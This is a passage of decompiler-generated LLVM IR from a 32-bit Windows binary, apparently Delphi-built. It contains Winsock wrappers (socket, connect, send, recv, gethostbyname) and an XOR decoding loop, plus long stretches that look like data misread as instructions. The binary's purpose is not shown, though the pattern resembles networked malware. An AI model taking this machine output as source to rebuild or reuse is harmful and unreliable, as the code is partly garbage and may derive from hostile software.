  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !224
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !225
  %2 = load i32, i32* @global_var_409664, align 4, !insn.addr !226
  %3 = add i32 %2, 1, !insn.addr !226
  store i32 %3, i32* @global_var_409664, align 4, !insn.addr !226
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !227
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !228
  ret i32 0, !insn.addr !229
}

define i32 @function_404639() local_unnamed_addr {
dec_label_pc_404639:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !230
  ret i32 %0, !insn.addr !230
}

define i32 @function_40463e() local_unnamed_addr {
dec_label_pc_40463e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !231
}

define i32 @function_404640(i32 %arg1) local_unnamed_addr {
dec_label_pc_404640:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !232
}

define i32 @function_404644() local_unnamed_addr {
dec_label_pc_404644:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409664, align 4, !insn.addr !233
  %2 = add i32 %1, -1, !insn.addr !233
  store i32 %2, i32* @global_var_409664, align 4, !insn.addr !233
  ret i32 %0, !insn.addr !234
}

define i32 @function_40464f() local_unnamed_addr {
dec_label_pc_40464f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %1, -1, !insn.addr !235
  %4 = inttoptr i32 %1 to i32*, !insn.addr !235
  store i32 %3, i32* %4, align 4, !insn.addr !235
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !236
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !236
  %9 = add i8 %6, %8, !insn.addr !236
  %10 = inttoptr i32 %7 to i8*, !insn.addr !236
  store i8 %9, i8* %10, align 1, !insn.addr !236
  %11 = add i32 %2, 101, !insn.addr !237
  %12 = inttoptr i32 %11 to i8*, !insn.addr !237
  %13 = load i8, i8* %12, align 1, !insn.addr !237
  %14 = udiv i32 %2, 256, !insn.addr !237
  %15 = trunc i32 %14 to i8, !insn.addr !237
  %16 = add i8 %13, %15, !insn.addr !237
  store i8 %16, i8* %12, align 1, !insn.addr !237
  %17 = add i32 %1, 101, !insn.addr !238
  %18 = inttoptr i32 %17 to i32*, !insn.addr !238
  %19 = load i32, i32* %18, align 4, !insn.addr !238
  %20 = mul i32 %19, 1819042862, !insn.addr !238
  %21 = load i8, i8* %5, align 4, !insn.addr !239
  %22 = add i8 %21, %15, !insn.addr !239
  %23 = load i32, i32* %eax, align 4, !insn.addr !239
  %24 = inttoptr i32 %23 to i8*, !insn.addr !239
  store i8 %22, i8* %24, align 1, !insn.addr !239
  %25 = load i8, i8* %5, align 4, !insn.addr !240
  %26 = load i32, i32* %eax, align 4
  %27 = trunc i32 %26 to i8, !insn.addr !240
  %28 = add i8 %25, %27, !insn.addr !240
  %29 = inttoptr i32 %26 to i8*, !insn.addr !240
  store i8 %28, i8* %29, align 1, !insn.addr !240
  %30 = load i8, i8* %5, align 4, !insn.addr !241
  %31 = load i32, i32* %eax, align 4
  %32 = trunc i32 %31 to i8, !insn.addr !241
  %33 = add i8 %30, %32, !insn.addr !241
  %34 = inttoptr i32 %31 to i8*, !insn.addr !241
  store i8 %33, i8* %34, align 1, !insn.addr !241
  %35 = load i8, i8* %5, align 4, !insn.addr !242
  %36 = load i32, i32* %eax, align 4
  %37 = trunc i32 %36 to i8, !insn.addr !242
  %38 = add i8 %35, %37, !insn.addr !242
  %39 = inttoptr i32 %36 to i8*, !insn.addr !242
  store i8 %38, i8* %39, align 1, !insn.addr !242
  %40 = add i32 %0, -117, !insn.addr !243
  %41 = inttoptr i32 %40 to i8*, !insn.addr !243
  %42 = load i8, i8* %41, align 1, !insn.addr !243
  %43 = trunc i32 %2 to i8, !insn.addr !243
  %44 = add i8 %42, %43, !insn.addr !243
  store i8 %44, i8* %41, align 1, !insn.addr !243
  %45 = trunc i32 %2 to i16, !insn.addr !244
  %46 = call i8 @__asm_in(i16 %45), !insn.addr !244
  %47 = add i32 %20, -8, !insn.addr !245
  %48 = inttoptr i32 %47 to i32*, !insn.addr !245
  store i32 4212417, i32* %48, align 4, !insn.addr !245
  %49 = call i32 @__readfsdword(i32 0), !insn.addr !246
  %50 = add i32 %20, -12, !insn.addr !246
  %51 = inttoptr i32 %50 to i32*, !insn.addr !246
  store i32 %49, i32* %51, align 4, !insn.addr !246
  call void @__writefsdword(i32 0, i32 %50), !insn.addr !247
  %52 = load i32, i32* @global_var_409678, align 4, !insn.addr !248
  %53 = add i32 %52, 1, !insn.addr !248
  %54 = icmp eq i32 %53, 0, !insn.addr !248
  store i32 %53, i32* @global_var_409678, align 4, !insn.addr !248
  %55 = icmp eq i1 %54, false, !insn.addr !249
  br i1 %55, label %dec_label_pc_4046b3, label %dec_label_pc_404681, !insn.addr !249

dec_label_pc_404681:                              ; preds = %dec_label_pc_40464f
  %56 = call i32 @"@LStrClr"(), !insn.addr !250
  %57 = call i32 @"@LStrClr"(), !insn.addr !251
  %58 = call i32 @"@LStrClr"(), !insn.addr !252
  %59 = call i32 @"@LStrClr"(), !insn.addr !253
  %60 = call i32 @"@LStrClr"(), !insn.addr !254
  br label %dec_label_pc_4046b3, !insn.addr !254

dec_label_pc_4046b3:                              ; preds = %dec_label_pc_404681, %dec_label_pc_40464f
  %61 = add i32 %20, -4, !insn.addr !255
  %62 = inttoptr i32 %61 to i32*, !insn.addr !255
  %63 = load i32, i32* %51, align 4, !insn.addr !256
  call void @__writefsdword(i32 0, i32 %63), !insn.addr !257
  store i32 4212424, i32* %62, align 4, !insn.addr !258
  ret i32 0, !insn.addr !259
}

define i32 @function_4046c1() local_unnamed_addr {
dec_label_pc_4046c1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !260
  ret i32 %0, !insn.addr !260
}

define i32 @function_4046c6() local_unnamed_addr {
dec_label_pc_4046c6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !261
}

define i32 @function_4046c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4046c8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !262
}

define i32 @function_4046cc() local_unnamed_addr {
dec_label_pc_4046cc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409678, align 4, !insn.addr !263
  %2 = add i32 %1, -1, !insn.addr !263
  store i32 %2, i32* @global_var_409678, align 4, !insn.addr !263
  ret i32 %0, !insn.addr !264
}

define i32 @function_4046d4() local_unnamed_addr {
dec_label_pc_4046d4:
  %eax.1.reg2mem = alloca i32, !insn.addr !265
  %esi.0.reg2mem = alloca i32, !insn.addr !265
  %ebx.0.reg2mem = alloca i32, !insn.addr !265
  %eax.0.reg2mem = alloca i32, !insn.addr !265
  %0 = call i32 @function_403720(), !insn.addr !266
  %1 = call i32 @function_4034c8(), !insn.addr !267
  %2 = icmp slt i32 %1, 1
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !268
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !268
  store i32 %0, i32* %esi.0.reg2mem, !insn.addr !268
  store i32 %1, i32* %eax.1.reg2mem, !insn.addr !268
  br i1 %2, label %dec_label_pc_404709, label %dec_label_pc_4046ef, !insn.addr !268

dec_label_pc_4046ef:                              ; preds = %dec_label_pc_4046d4, %dec_label_pc_4046ef
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %3 = add i32 %ebx.0.reload, ptrtoint (i8** @global_var_4080d0 to i32), !insn.addr !269
  %4 = inttoptr i32 %3 to i8*, !insn.addr !269
  %5 = load i8, i8* %4, align 1, !insn.addr !269
  %6 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !270
  %7 = load i8, i8* %6, align 1, !insn.addr !270
  %8 = xor i8 %7, %5, !insn.addr !270
  store i8 %8, i8* %6, align 1, !insn.addr !270
  %9 = add i32 %esi.0.reload, 1, !insn.addr !271
  %10 = add i32 %ebx.0.reload, 1, !insn.addr !272
  %11 = and i32 %10, -2147483641, !insn.addr !273
  %12 = icmp slt i32 %11, 0, !insn.addr !273
  %13 = icmp eq i1 %12, false, !insn.addr !274
  %14 = or i32 %ebx.0.reload, -8
  %15 = add nsw i32 %14, 1
  %ebx.1 = select i1 %13, i32 %11, i32 %15
  %16 = add i32 %eax.0.reload, -1, !insn.addr !275
  %17 = icmp eq i32 %16, 0, !insn.addr !275
  %18 = icmp eq i1 %17, false, !insn.addr !276
  store i32 %16, i32* %eax.0.reg2mem, !insn.addr !276
  store i32 %ebx.1, i32* %ebx.0.reg2mem, !insn.addr !276
  store i32 %9, i32* %esi.0.reg2mem, !insn.addr !276
  store i32 %16, i32* %eax.1.reg2mem, !insn.addr !276
  br i1 %18, label %dec_label_pc_4046ef, label %dec_label_pc_404709, !insn.addr !276

dec_label_pc_404709:                              ; preds = %dec_label_pc_4046ef, %dec_label_pc_4046d4
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !277
}

define i32 @function_404710() local_unnamed_addr {
dec_label_pc_404710:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !278
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !278
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !278
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !279
  %2 = load i32, i32* @global_var_40967c, align 4, !insn.addr !280
  %3 = add i32 %2, 1, !insn.addr !280
  store i32 %3, i32* @global_var_40967c, align 4, !insn.addr !280
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !281
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !282
  ret i32 0, !insn.addr !283
}

define i32 @function_404735() local_unnamed_addr {
dec_label_pc_404735:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !284
  ret i32 %0, !insn.addr !284
}

define i32 @function_40473a() local_unnamed_addr {
dec_label_pc_40473a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !285
}

define i32 @function_40473c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40473c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !286
}

define i32 @function_404740() local_unnamed_addr {
dec_label_pc_404740:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40967c, align 4, !insn.addr !287
  %2 = add i32 %1, -1, !insn.addr !287
  store i32 %2, i32* @global_var_40967c, align 4, !insn.addr !287
  ret i32 %0, !insn.addr !288
}

define i32 @function_404748() local_unnamed_addr {
dec_label_pc_404748:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !289
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !289
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !289
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !290
  %2 = load i32, i32* @global_var_409680, align 4, !insn.addr !291
  %3 = add i32 %2, 1, !insn.addr !291
  store i32 %3, i32* @global_var_409680, align 4, !insn.addr !291
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !292
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !293
  ret i32 0, !insn.addr !294
}

define i32 @function_40476d() local_unnamed_addr {
dec_label_pc_40476d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !295
  ret i32 %0, !insn.addr !295
}

define i32 @function_404772() local_unnamed_addr {
dec_label_pc_404772:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !296
}

define i32 @function_404774(i32 %arg1) local_unnamed_addr {
dec_label_pc_404774:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !297
}

define i32 @function_404778() local_unnamed_addr {
dec_label_pc_404778:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409680, align 4, !insn.addr !298
  %2 = add i32 %1, -1, !insn.addr !298
  store i32 %2, i32* @global_var_409680, align 4, !insn.addr !298
  ret i32 %0, !insn.addr !299
}

define i32 @function_404780(i32 %s) local_unnamed_addr {
dec_label_pc_404780:
  %0 = call i32 @closesocket(i32 %s), !insn.addr !300
  ret i32 %0, !insn.addr !300
}

define i32 @function_404788(i32 %s, %sockaddr* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_404788:
  %0 = call i32 @connect(i32 %s, %sockaddr* %name, i32 %namelen), !insn.addr !301
  ret i32 %0, !insn.addr !301
}

define i16 @function_404790(i16 %hostshort) local_unnamed_addr {
dec_label_pc_404790:
  %0 = call i16 @htons(i16 %hostshort), !insn.addr !302
  ret i16 %0, !insn.addr !302
}

define i8* @function_404798(%in_addr %in) local_unnamed_addr {
dec_label_pc_404798:
  %0 = call i8* @inet_ntoa(%in_addr %in), !insn.addr !303
  ret i8* %0, !insn.addr !303
}

define i32 @function_4047a0(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a0:
  %0 = call i32 @recv(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !304
  ret i32 %0, !insn.addr !304
}

define i32 @function_4047a8(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a8:
  %0 = call i32 @send(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !305
  ret i32 %0, !insn.addr !305
}

define i32 @function_4047b0(i32 %af, i32 %type, i32 %protocol) local_unnamed_addr {
dec_label_pc_4047b0:
  %0 = call i32 @socket(i32 %af, i32 %type, i32 %protocol), !insn.addr !306
  ret i32 %0, !insn.addr !306
}

define %hostent* @function_4047b8(i8* %name) local_unnamed_addr {
dec_label_pc_4047b8:
  %0 = call %hostent* @gethostbyname(i8* %name), !insn.addr !307
  ret %hostent* %0, !insn.addr !307
}

define i32 @function_4047c0(i8* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_4047c0:
  %0 = call i32 @gethostname(i8* %name, i32 %namelen), !insn.addr !308
  ret i32 %0, !insn.addr !308
}

define i32 @function_4047c8(i16 %wVersionRequested, %WSAData* %lpWSAData) local_unnamed_addr {
dec_label_pc_4047c8:
  %0 = call i32 @WSAStartup(i16 %wVersionRequested, %WSAData* %lpWSAData), !insn.addr !309
  ret i32 %0, !insn.addr !309
}

define i32 @function_4047d0() local_unnamed_addr {
dec_label_pc_4047d0:
  %0 = call i32 @WSACleanup(), !insn.addr !310
  ret i32 %0, !insn.addr !310
}

define i32 @function_4047d8() local_unnamed_addr {
dec_label_pc_4047d8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !311
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !311
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !311
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !312
  %2 = load i32, i32* @global_var_409684, align 4, !insn.addr !313
  %3 = add i32 %2, 1, !insn.addr !313
  store i32 %3, i32* @global_var_409684, align 4, !insn.addr !313
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !314
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !315
  ret i32 0, !insn.addr !316
}

define i32 @function_4047fd() local_unnamed_addr {
dec_label_pc_4047fd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !317
  ret i32 %0, !insn.addr !317
}

define i32 @function_404802() local_unnamed_addr {
dec_label_pc_404802:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !318
}

define i32 @function_404804(i32 %arg1) local_unnamed_addr {
dec_label_pc_404804:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !319
}

define i32 @function_404808() local_unnamed_addr {
dec_label_pc_404808:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409684, align 4, !insn.addr !320
  %2 = add i32 %1, -1, !insn.addr !320
  store i32 %2, i32* @global_var_409684, align 4, !insn.addr !320
  ret i32 %0, !insn.addr !321
}

define i32 @function_404810() local_unnamed_addr {
dec_label_pc_404810:
  %ecx.1.reg2mem = alloca i32, !insn.addr !322
  %.pre-phi2.reg2mem = alloca i8, !insn.addr !322
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = call i1 @__decompiler_undefined_function_1()
  %4 = add i32 %0, 117, !insn.addr !322
  %5 = inttoptr i32 %4 to i32*, !insn.addr !322
  %6 = load i32, i32* %5, align 4, !insn.addr !322
  br i1 %3, label %dec_label_pc_404891, label %dec_label_pc_40481b, !insn.addr !323

dec_label_pc_40481b:                              ; preds = %dec_label_pc_404810
  %7 = mul i32 %6, 1616934626, !insn.addr !324
  %8 = add i32 %7, %2, !insn.addr !324
  %9 = inttoptr i32 %8 to i64*, !insn.addr !324
  %10 = load i64, i64* %9, align 4, !insn.addr !324
  %11 = call i32 @__asm_bound(i64 %10), !insn.addr !324
  %12 = bitcast i32* %eax to i8*
  %13 = load i8, i8* %12, align 4, !insn.addr !325
  %14 = load i32, i32* %eax, align 4
  %15 = trunc i32 %14 to i8, !insn.addr !325
  %16 = add i8 %13, %15, !insn.addr !325
  %17 = inttoptr i32 %14 to i8*, !insn.addr !325
  store i8 %16, i8* %17, align 1, !insn.addr !325
  %18 = load i8, i8* %12, align 4, !insn.addr !326
  %19 = load i32, i32* %eax, align 4
  %20 = trunc i32 %19 to i8, !insn.addr !326
  %21 = add i8 %18, %20, !insn.addr !326
  %22 = inttoptr i32 %19 to i8*, !insn.addr !326
  store i8 %21, i8* %22, align 1, !insn.addr !326
  %23 = load i8, i8* %12, align 4, !insn.addr !327
  %24 = load i32, i32* %eax, align 4
  %25 = trunc i32 %24 to i8, !insn.addr !327
  %26 = add i8 %23, %25, !insn.addr !327
  %27 = inttoptr i32 %24 to i8*, !insn.addr !327
  store i8 %26, i8* %27, align 1, !insn.addr !327
  %28 = load i8, i8* %12, align 4, !insn.addr !328
  %29 = load i32, i32* %eax, align 4
  %30 = trunc i32 %29 to i8, !insn.addr !328
  %31 = add i8 %28, %30, !insn.addr !328
  %32 = inttoptr i32 %29 to i8*, !insn.addr !328
  store i8 %31, i8* %32, align 1, !insn.addr !328
  %33 = load i8, i8* %12, align 4, !insn.addr !329
  %34 = load i32, i32* %eax, align 4
  %35 = trunc i32 %34 to i8, !insn.addr !329
  %36 = add i8 %33, %35, !insn.addr !329
  %37 = inttoptr i32 %34 to i8*, !insn.addr !329
  store i8 %36, i8* %37, align 1, !insn.addr !329
  %38 = load i8, i8* %12, align 4, !insn.addr !330
  %39 = load i32, i32* %eax, align 4
  %40 = trunc i32 %39 to i8, !insn.addr !330
  %41 = add i8 %38, %40, !insn.addr !330
  %42 = inttoptr i32 %39 to i8*, !insn.addr !330
  store i8 %41, i8* %42, align 1, !insn.addr !330
  %43 = load i8, i8* %12, align 4, !insn.addr !331
  %44 = load i32, i32* %eax, align 4
  %45 = trunc i32 %44 to i8, !insn.addr !331
  %46 = add i8 %43, %45, !insn.addr !331
  %47 = inttoptr i32 %44 to i8*, !insn.addr !331
  store i8 %46, i8* %47, align 1, !insn.addr !331
  %48 = load i8, i8* %12, align 4, !insn.addr !332
  %49 = load i32, i32* %eax, align 4
  %50 = trunc i32 %49 to i8, !insn.addr !332
  %51 = add i8 %48, %50, !insn.addr !332
  %52 = inttoptr i32 %49 to i8*, !insn.addr !332
  store i8 %51, i8* %52, align 1, !insn.addr !332
  %53 = load i8, i8* %12, align 4, !insn.addr !333
  %54 = load i32, i32* %eax, align 4
  %55 = trunc i32 %54 to i8, !insn.addr !333
  %56 = add i8 %53, %55, !insn.addr !333
  %57 = inttoptr i32 %54 to i8*, !insn.addr !333
  store i8 %56, i8* %57, align 1, !insn.addr !333
  %58 = load i8, i8* %12, align 4, !insn.addr !334
  %59 = load i32, i32* %eax, align 4
  %60 = trunc i32 %59 to i8, !insn.addr !334
  %61 = add i8 %58, %60, !insn.addr !334
  %62 = inttoptr i32 %59 to i8*, !insn.addr !334
  store i8 %61, i8* %62, align 1, !insn.addr !334
  %63 = load i8, i8* %12, align 4, !insn.addr !335
  %64 = load i32, i32* %eax, align 4
  %65 = trunc i32 %64 to i8, !insn.addr !335
  %66 = add i8 %63, %65, !insn.addr !335
  %67 = inttoptr i32 %64 to i8*, !insn.addr !335
  store i8 %66, i8* %67, align 1, !insn.addr !335
  %68 = load i8, i8* %12, align 4, !insn.addr !336
  %69 = load i32, i32* %eax, align 4
  %70 = trunc i32 %69 to i8, !insn.addr !336
  %71 = add i8 %68, %70, !insn.addr !336
  %72 = inttoptr i32 %69 to i8*, !insn.addr !336
  store i8 %71, i8* %72, align 1, !insn.addr !336
  %73 = load i8, i8* %12, align 4, !insn.addr !337
  %74 = load i32, i32* %eax, align 4
  %75 = trunc i32 %74 to i8, !insn.addr !337
  %76 = add i8 %73, %75, !insn.addr !337
  %77 = inttoptr i32 %74 to i8*, !insn.addr !337
  store i8 %76, i8* %77, align 1, !insn.addr !337
  %78 = load i8, i8* %12, align 4, !insn.addr !338
  %79 = load i32, i32* %eax, align 4
  %80 = trunc i32 %79 to i8, !insn.addr !338
  %81 = add i8 %78, %80, !insn.addr !338
  %82 = inttoptr i32 %79 to i8*, !insn.addr !338
  store i8 %81, i8* %82, align 1, !insn.addr !338
  %83 = load i8, i8* %12, align 4, !insn.addr !339
  %84 = load i32, i32* %eax, align 4
  %85 = trunc i32 %84 to i8, !insn.addr !339
  %86 = add i8 %83, %85, !insn.addr !339
  %87 = inttoptr i32 %84 to i8*, !insn.addr !339
  store i8 %86, i8* %87, align 1, !insn.addr !339
  %88 = load i8, i8* %12, align 4, !insn.addr !340
  %89 = load i32, i32* %eax, align 4
  %90 = trunc i32 %89 to i8, !insn.addr !340
  %91 = add i8 %88, %90, !insn.addr !340
  %92 = inttoptr i32 %89 to i8*, !insn.addr !340
  store i8 %91, i8* %92, align 1, !insn.addr !340
  %93 = load i8, i8* %12, align 4, !insn.addr !341
  %94 = load i32, i32* %eax, align 4
  %95 = trunc i32 %94 to i8, !insn.addr !341
  %96 = add i8 %93, %95, !insn.addr !341
  %97 = inttoptr i32 %94 to i8*, !insn.addr !341
  store i8 %96, i8* %97, align 1, !insn.addr !341
  %98 = load i8, i8* %12, align 4, !insn.addr !342
  %99 = load i32, i32* %eax, align 4
  %100 = trunc i32 %99 to i8, !insn.addr !342
  %101 = add i8 %98, %100, !insn.addr !342
  %102 = inttoptr i32 %99 to i8*, !insn.addr !342
  store i8 %101, i8* %102, align 1, !insn.addr !342
  %103 = load i8, i8* %12, align 4, !insn.addr !343
  %104 = load i32, i32* %eax, align 4
  %105 = trunc i32 %104 to i8, !insn.addr !343
  %106 = add i8 %103, %105, !insn.addr !343
  %107 = inttoptr i32 %104 to i8*, !insn.addr !343
  store i8 %106, i8* %107, align 1, !insn.addr !343
  %108 = load i8, i8* %12, align 4, !insn.addr !344
  %109 = load i32, i32* %eax, align 4
  %110 = trunc i32 %109 to i8, !insn.addr !344
  %111 = add i8 %108, %110, !insn.addr !344
  %112 = inttoptr i32 %109 to i8*, !insn.addr !344
  store i8 %111, i8* %112, align 1, !insn.addr !344
  %113 = load i32, i32* %eax, align 4, !insn.addr !344
  ret i32 %113, !insn.addr !344

dec_label_pc_404891:                              ; preds = %dec_label_pc_404810
  %114 = mul i32 %6, 808467313, !insn.addr !322
  %115 = bitcast i32* %eax to i8*
  %116 = load i8, i8* %115, align 4, !insn.addr !345
  %117 = load i32, i32* %eax, align 4
  %118 = trunc i32 %117 to i8, !insn.addr !345
  %119 = add i8 %116, %118, !insn.addr !345
  %120 = inttoptr i32 %117 to i8*, !insn.addr !345
  store i8 %119, i8* %120, align 1, !insn.addr !345
  %121 = load i8, i8* %115, align 4, !insn.addr !346
  %122 = load i32, i32* %eax, align 4
  %123 = trunc i32 %122 to i8, !insn.addr !346
  %124 = add i8 %121, %123, !insn.addr !346
  %125 = inttoptr i32 %122 to i8*, !insn.addr !346
  store i8 %124, i8* %125, align 1, !insn.addr !346
  %126 = load i8, i8* %115, align 4, !insn.addr !347
  %127 = load i32, i32* %eax, align 4
  %128 = trunc i32 %127 to i8, !insn.addr !347
  %129 = add i8 %126, %128, !insn.addr !347
  %130 = inttoptr i32 %127 to i8*, !insn.addr !347
  store i8 %129, i8* %130, align 1, !insn.addr !347
  %131 = add i32 %2, 108, !insn.addr !348
  %132 = inttoptr i32 %131 to i8*, !insn.addr !348
  %133 = load i8, i8* %132, align 1, !insn.addr !348
  %134 = udiv i32 %2, 256
  %135 = trunc i32 %134 to i8
  %136 = add i8 %133, %135, !insn.addr !348
  %137 = icmp slt i8 %136, 0, !insn.addr !348
  store i8 %136, i8* %132, align 1, !insn.addr !348
  %138 = icmp eq i1 %137, false, !insn.addr !349
  store i8 %135, i8* %.pre-phi2.reg2mem, !insn.addr !349
  br i1 %138, label %dec_label_pc_4048d3, label %dec_label_pc_40489d, !insn.addr !349

dec_label_pc_40489d:                              ; preds = %dec_label_pc_404891
  %139 = add i32 %2, 1, !insn.addr !350
  %140 = trunc i32 %1 to i16, !insn.addr !351
  %141 = call i32 @__readfsdword(i32 %114), !insn.addr !351
  call void @__asm_outsd(i16 %140, i32 %141), !insn.addr !351
  %142 = load i8, i8* %115, align 4, !insn.addr !352
  %143 = load i32, i32* %eax, align 4
  %144 = trunc i32 %143 to i8, !insn.addr !352
  %145 = add i8 %142, %144, !insn.addr !352
  %146 = inttoptr i32 %143 to i8*, !insn.addr !352
  store i8 %145, i8* %146, align 1, !insn.addr !352
  %147 = load i8, i8* %115, align 4, !insn.addr !353
  %148 = load i32, i32* %eax, align 4
  %149 = trunc i32 %148 to i8, !insn.addr !353
  %150 = add i8 %147, %149, !insn.addr !353
  %151 = inttoptr i32 %148 to i8*, !insn.addr !353
  store i8 %150, i8* %151, align 1, !insn.addr !353
  %152 = load i8, i8* %115, align 4, !insn.addr !354
  %153 = load i32, i32* %eax, align 4
  %154 = trunc i32 %153 to i8, !insn.addr !354
  %155 = add i8 %152, %154, !insn.addr !354
  %156 = inttoptr i32 %153 to i8*, !insn.addr !354
  store i8 %155, i8* %156, align 1, !insn.addr !354
  %157 = load i8, i8* %115, align 4, !insn.addr !355
  %158 = load i32, i32* %eax, align 4
  %159 = trunc i32 %158 to i8, !insn.addr !355
  %160 = add i8 %157, %159, !insn.addr !355
  %161 = inttoptr i32 %158 to i8*, !insn.addr !355
  store i8 %160, i8* %161, align 1, !insn.addr !355
  %162 = load i8, i8* %115, align 4, !insn.addr !356
  %163 = load i32, i32* %eax, align 4
  %164 = trunc i32 %163 to i8, !insn.addr !356
  %165 = add i8 %162, %164, !insn.addr !356
  %166 = inttoptr i32 %163 to i8*, !insn.addr !356
  store i8 %165, i8* %166, align 1, !insn.addr !356
  %167 = load i8, i8* %115, align 4, !insn.addr !357
  %168 = load i32, i32* %eax, align 4
  %169 = trunc i32 %168 to i8, !insn.addr !357
  %170 = add i8 %167, %169, !insn.addr !357
  %171 = inttoptr i32 %168 to i8*, !insn.addr !357
  store i8 %170, i8* %171, align 1, !insn.addr !357
  %172 = load i8, i8* %115, align 4, !insn.addr !358
  %173 = load i32, i32* %eax, align 4
  %174 = trunc i32 %173 to i8, !insn.addr !358
  %175 = add i8 %172, %174, !insn.addr !358
  %176 = inttoptr i32 %173 to i8*, !insn.addr !358
  store i8 %175, i8* %176, align 1, !insn.addr !358
  %177 = load i8, i8* %115, align 4, !insn.addr !359
  %178 = load i32, i32* %eax, align 4
  %179 = trunc i32 %178 to i8, !insn.addr !359
  %180 = add i8 %177, %179, !insn.addr !359
  %181 = inttoptr i32 %178 to i8*, !insn.addr !359
  store i8 %180, i8* %181, align 1, !insn.addr !359
  %182 = load i8, i8* %115, align 4, !insn.addr !360
  %183 = load i32, i32* %eax, align 4
  %184 = trunc i32 %183 to i8, !insn.addr !360
  %185 = add i8 %182, %184, !insn.addr !360
  %186 = inttoptr i32 %183 to i8*, !insn.addr !360
  store i8 %185, i8* %186, align 1, !insn.addr !360
  %187 = load i8, i8* %115, align 4, !insn.addr !361
  %188 = load i32, i32* %eax, align 4
  %189 = trunc i32 %188 to i8, !insn.addr !361
  %190 = add i8 %187, %189, !insn.addr !361
  %191 = inttoptr i32 %188 to i8*, !insn.addr !361
  store i8 %190, i8* %191, align 1, !insn.addr !361
  %192 = load i8, i8* %115, align 4, !insn.addr !362
  %193 = load i32, i32* %eax, align 4
  %194 = trunc i32 %193 to i8, !insn.addr !362
  %195 = add i8 %192, %194, !insn.addr !362
  %196 = inttoptr i32 %193 to i8*, !insn.addr !362
  store i8 %195, i8* %196, align 1, !insn.addr !362
  %197 = load i8, i8* %115, align 4, !insn.addr !363
  %198 = load i32, i32* %eax, align 4
  %199 = trunc i32 %198 to i8, !insn.addr !363
  %200 = add i8 %197, %199, !insn.addr !363
  %201 = inttoptr i32 %198 to i8*, !insn.addr !363
  store i8 %200, i8* %201, align 1, !insn.addr !363
  %202 = load i8, i8* %115, align 4, !insn.addr !364
  %203 = load i32, i32* %eax, align 4
  %204 = trunc i32 %203 to i8, !insn.addr !364
  %205 = add i8 %202, %204, !insn.addr !364
  %206 = inttoptr i32 %203 to i8*, !insn.addr !364
